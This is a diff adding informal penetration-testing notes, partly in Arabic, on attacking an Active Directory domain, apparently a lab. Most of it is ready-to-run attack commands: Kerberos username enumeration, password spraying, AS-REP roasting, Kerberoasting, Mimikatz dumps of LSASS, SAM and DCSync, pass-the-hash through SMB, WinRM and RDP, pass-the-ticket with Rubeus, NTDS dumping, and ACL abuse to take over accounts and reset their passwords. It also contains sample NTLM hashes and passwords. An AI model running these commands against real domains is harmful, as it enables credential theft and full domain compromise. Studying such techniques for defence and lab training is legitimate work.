@@ -1,0 +1,159 @@
+kerbros only porty 88 
+
+
+ATTACK 
+USERNAME ENUM
+
+kerbrte tool 
+
+problem : some domains name names in different schemas 
+ex: ahmed.tamer , a.tamer , ahmed-tamer
+
+soluu : namesh :  gave it the name AHmed Tamer and the tool give u diff schemas for the same name
+
+python namesh.py users.txt > allUsers.txt 
+./kerbrute_linux_amd64 userenum --dc 10.82.158.3 -d controller.local allUsers.txt
+
+@Test12356
+@Test1235
+#password spraying 
+u have one password and u try it in all users u had 
+
+
+
+# LLMNR POSINING (MITIGATIOn SMB SIGNING ENABLED AND FORCED)
+network connection + password list + users 
+
+
+# asrep roasting
+C:\Users\Administrator\Desktop\Rubeus.exe asreproasts /nowrap
+impacket-GetNPUsers controller.local/ -dc-ip 10.82.158.3 -usersfile valid_users.txt -format john -outputfile crackme
+.txt -no-pass -request
+
+#Kerbrosting 
+P@ssw0rd
+impacket-GetUserSPNs controller.local/Administrator:'P@$$W0rd' -dc-ip 10.66.163.23 -request -format john -outputfile serviceHash.txt
+
+
+# Credetials Dumpig 
+- SAM , NTDS.dit , LSSAS , Browser
+
+When a user logs into a Windows machine or a Domain Controller, LSASS caches their credentials
+ in its process memory to enable Single Sign-On (SSO).
+ This prevents the user from having to re-type their password every time they access a network share,
+ printer, or application.
+ 
+ Mimikatz primarily targets the LSASS (Local Security Authority Subsystem Service) process.
+ It interacts with the Windows API to read the memory space where Windows temporarily stores credentials to enable Single Sign-On (SSO).
+ 
+ 
+- SAM FILE ATTACK (Local ADMIN required)
+
+privilege::debug
+token::elevate
+sekurlsa::logonpasswords
+lsadump::sam
+
+
+- Ovor - Pass the hash (DOMAIN) DC
+
+we will use the hash we got from previous attack and get authnticated in 
+
+we will uuse this command to check if the hash is correct 
+
+nxc smb 10.80.165.187 -u 'administrator' -H '2777b7fec870e04dda00cd7260f7bee6'
+login with command line 
+impacket-psexec 'child/child-admin@10.10.10.2' -hashes :dbac2b57a73bb883422658d2aea36967 
+sign in as rdp from just the hash 
+nxc smb 10.80.165.187 -u 'administrator' -H '2777b7fec870e04dda00cd7260f7bee6' -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
+xfreerdp3 /u:administrator /pth:'2777b7fec870e04dda00cd7260f7bee6' /d:controller.local /v:10.80.174.72 /dynamic-resolution
+
+
+$ this works onlyy if u are in (Remote Managment Group)
+(fromLINUX)
+evil-winrm -i 10.80.165.187 -u Administrator -H 2777b7fec870e04dda00cd7260f7bee6
+
+(FROM WINDOWS)
+
+Enter-PSSession -ComputerName Domain-Controller
+
+
+طب عشان نستغل الامر ده كويس ونشوف مين مثلا ف الجروب ده 
+التاكد من ووده اولا 
+ Get-ADGroup -Filter 'Name -like "*Remote*"'
+ 
+لو موجود هات اليوزرز الي فيه 
+ Get-ADGroupMember -Identity "Remote Management Users"
+ 
+ بعدها هتشوف اللوجز تحاول تشوف اليوزر ده دخل ن انهي جهاز 
+ Get-EventLog -LogName Security -InstanceId 4624 | Where-Object {$_.Message -like "*ahmed.emad*"}
+ 
+ او 
+ sekurlsa::pth /user:ahmed.emad /domain:CONTROLLER.local /ntlm:HASH_HERE /run:powershell.exe
+ 
+ فتحت باور شل ك اليوزر ده 
+ بعدها 
+ Enter-PSSession
+ 
+ 
+ - ًWHat if i want the tgt ticket and import it to be auth with this user 
+ 
+ Rubeus.exe asktgt /user:ahmed.emad /rc4:F0A05D8050AC628A63725BD2A518167C /domain:controller.local /nowrap /ptt
+ 
+ # Pass THe Hash (local) SAM
+ nxc smb 10.80.165.187 -u 'administrator' -H '2777b7fec870e04dda00cd7260f7bee6' --local-auth
+ 
+ klist -> list the user that has imported his tickets
+ 
+ 
+ # NTDS.dit dump  [ admin on the dc  or privililage replication]
+ impacket-secretsdump contorller.local/ramez.saber@10.80.174.72 -hashes :A3AB2DDD1DB577A8423BFB9CB6F87A20
+ 
+ lsadump::dcsync /user:controller\administrator /domain:controller.local
+ 
+ 
+ 
+ 
+ # changt user password 
+ 
+ net rpc password ahmed.gamal -U controller/'ramez.saber'%'P@ssw0rd' -S 10.81.162.178
+ 
+ 
+ 
+ # 
+ 
+ 
+ 
+ # إنشاء مستخدم رامز صابر
+New-ADUser -Name "ahmed.emad" -SamAccountName "ahmed.emad" -UserPrincipalName "ramez.saber@controller.local" -Enabled $true -PasswordNeverExpires $true -AccountPassword (Read-Host -AsSecureString "@Test12345")
+
+# إنشاء مستخدم عمر فاضل
+New-ADUser -Name "omar fadel" -SamAccountName "omar.fadel" -UserPrincipalName "omar.fadel@controller.local" -Enabled $true -PasswordNeverExpires $true -AccountPassword (Read-Host -AsSecureString "@Test12345")
+ 
+ 
+ 
+ $UserRamez = Get-ADUser "ahmed.emad"
+$UserOmar = Get-ADUser "omar.fadel"
+$ACL = Get-Acl "AD:\$($UserOmar.DistinguishedName)"
+
+# إضافة حق WriteOwner لرامز على عمر
+$SID = New-Object System.Security.Principal.SecurityIdentifier($UserRamez.SID)
+$Rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($SID, "WriteOwner", "Allow")
+$ACL.AddAccessRule($Rule)
+Set-Acl "AD:\$($UserOmar.DistinguishedName)" $ACL
+ 
+ 
+ impacket-owneredit -action write -new-owner 'ramez.saber' -target-dn 'CN=omar fadel,CN=Users,DC=CONTROLLER,DC=local' 'controller.local'/'ramez.saber':'P@ssw0rd' -dc-ip 10.81.162.178
+ 
+ impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ramez.saber' -target-dn 'CN=omar fadel,CN=Users,DC=CONTROLLER,DC=local' 'controller.local'/'ramez.saber':'P@ssw0rd' -dc-ip 10.81.162.178
+ 
+ net rpc password omar.fadel -U controller.local/'ramez.saber'%'P@ssw0rd' -S 10.81.162.178
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ net rpc password mohamed.fadel -U controller/'ramez.saber'%'P@ssw0rd' -S 10.81.162.178
